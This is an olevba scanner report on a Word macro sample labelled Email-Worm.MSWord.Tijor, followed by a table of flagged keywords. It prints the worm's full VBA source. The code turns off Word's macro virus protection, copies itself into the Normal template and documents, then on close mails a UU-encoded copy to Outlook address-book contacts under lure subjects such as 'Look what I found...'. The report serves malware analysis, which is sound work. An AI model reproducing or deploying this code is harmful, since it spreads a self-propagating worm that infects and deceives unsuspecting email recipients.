olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Tijor-6c5dd143fcca7dd27734d23ef17bbf513d450518
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.MSWord.Tijor-6c5dd143fcca7dd27734d23ef17bbf513d450518 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO tijor.bas 
in file: Email-Worm.MSWord.Tijor-6c5dd143fcca7dd27734d23ef17bbf513d450518 - OLE stream: 'Macros/VBA/tijor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
On Error Resume Next
Dim docz
' tijor by ULTRAS [MATRiX]
' (c) 2000
CommandBars("Tools").Controls("Macro").Enabled = False
Options.VirusProtection = (1 - 1)
Options.SaveNormalPrompt = (1 - 1)
win = Environ("windir")
docz = win & "\re.doc"
Application.VBE.ActiveVBProject.VBComponents("tijor").Export win & "\tijor.vxd"
For T = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(T).Name = "tijor" Then NC = True
Next T
For U = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(U).Name = "tijor" Then AC = True
Next U
If AC = True And NC = False Then Set tij = NormalTemplate.VBProject _
Else If AC = False And NC = True Then Set tij = ActiveDocument.VBProject
With tij
With .VBComponents.Import(win & "\tijor.vxd")
End With
End With
If AC = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
ActiveDocument.SaveAs FileName:=z, FileFormat:=wdFormatDocument
End Sub

Sub AutoClose()
On Error Resume Next
Dim win, packIt
win = Environ("windir")
packIt = UUEncode(win & "\re.doc", win & "\" & "" & Application.UserName & "" & ".uue")
Set OutlookApp = CreateObject("Outlook.Application")
Set MAPIuz = OutlookApp.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\tijor\", "Tijor") <> "by ULTRAS[MATRiX]" Then
If OutlookApp = "Outlook" Then
MAPIuz.Logon "profile", "password"
For Address = 1 To MAPIuz.AddressLists.Count
Set AddyBook = MAPIuz.AddressLists(Address)
countz = 1
Set Guan0utlook = OutlookApp.CreateItem(0)
For mmez = 1 To AddyBook.AddressEntries.Count
AddBZ = AddyBook.AddressEntries(countz)
Guan0utlook.Recipients.Add AddBZ
countz = countz + 1
If countz > 30 Then oo = AddyBook.AddressEntries.Count
Next mmez
Randomize
numberz = Int(Rnd * 9) + 1
If numberz = 1 Then mez$ = "Read this..."
If numberz = 2 Then mez$ = "" & Application.UserName & " :)"
If numberz = 3 Then mez$ = "Unpack it."
If numberz = 4 Then mez$ = "New story"
If numberz = 5 Then mez$ = "Re:"
If numberz = 6 Then mez$ = "Important Info"
If numberz = 7 Then mez$ = "This is interesting..."
If numberz = 8 Then mez$ = "Look what I found..."
If numberz = 9 Then mez$ = "Check this out..."
Guan0utlook.Subject = mez$
Guan0utlook.Body = mez$
Guan0utlook.Attachments.Add win & "\" & "" & Application.UserName & "" & ".uue"
Guan0utlook.Send
AddBZ = ""
Next Address
MAPIuz.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\tijor\", "Tijor") = "by ULTRAS[MATRiX]"
End If
End Sub

Function Encode(sDa As String) As String
Dim szOut As String
Dim nChar As Integer
Dim i As Integer
If Len(sDa) Mod 3 <> 0 Then sDa = sDa & Space(3 - Len(sDa) Mod 3)
For i = 1 To Len(sDa) Step 3
szOut = szOut & Chr(Asc(Mid(sDa, i, 1)) \ 4 + 32)
szOut = szOut & Chr((Asc(Mid(sDa, i, 1)) Mod 4) * 16 + Asc(Mid(sDa, i + 1, 1)) \ 16 + 32)
szOut = szOut & Chr((Asc(Mid(sDa, i + 1, 1)) Mod 16) * 4 + Asc(Mid(sDa, i + 2, 1)) \ 64 + 32)
szOut = szOut & Chr(Asc(Mid(sDa, i + 2, 1)) Mod 64 + 32)
Next i
Encode = szOut
End Function

Function UUEncode(fileIn As String, fileOut As String) As Integer
Dim nFi As Integer, nFo As Integer
Dim indx As Integer, sDa As String
Dim lbytei As Long, lfull As Long, lmaxl As Long
On Error GoTo ERR_UUEncode
nFi = FreeFile
Open fileIn For Binary As nFi
lbytei = LOF(nFi)
nFo = FreeFile
Open fileOut For Output As nFo
For indx = Len(fileIn) - 1 To 1 Step -1
If Mid$(fileIn, indx, 1) = "\" Then
fileIn = Mid$(fileIn, indx + 1)
Exit For
End If
Next
Print #nFo, "begin 644 " & fileIn
lfull = lbytei \ 45
sDa = Space(45)
While lfull > 0
Get nFi, , sDa
Print #nFo, "M" & Encode(sDa)
lfull = lfull - 1
DoEvents
Wend
sDa = Space(lbytei Mod 45)
Get nFi, , sDa
Print #nFo, Chr(Len(sDa) + 32) & Encode(sDa)
Print #nFo, "end"
Close nFi
Close nFo
ERR_UUEncode:
Close nFi
Close nFo
Exit Function
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

